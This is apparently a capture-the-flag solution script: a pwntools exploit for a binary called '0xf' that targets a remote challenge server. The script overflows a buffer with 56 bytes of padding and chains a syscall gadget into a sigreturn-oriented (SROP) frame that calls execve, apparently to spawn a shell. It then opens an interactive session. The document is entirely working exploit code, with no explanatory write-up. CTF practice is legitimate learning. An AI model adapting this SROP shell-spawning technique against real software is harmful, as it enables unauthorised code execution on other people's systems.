#!/usr/bin/python3

from pwn import *

exe = ELF('0xf', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main +55

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chall.battlectf.online',     1009)
else:
        p = process(exe.path)

GDB()
syscall = 0x0000000000401140

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x402004
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0
frame.rip = syscall

payload = b"a" * 56 + p64(exe.sym['hausa']+1) + p64(syscall) + bytes(frame)
sla(b"ethnicity:\n", payload)

frame = SigreturnFrame()


p.interactive()
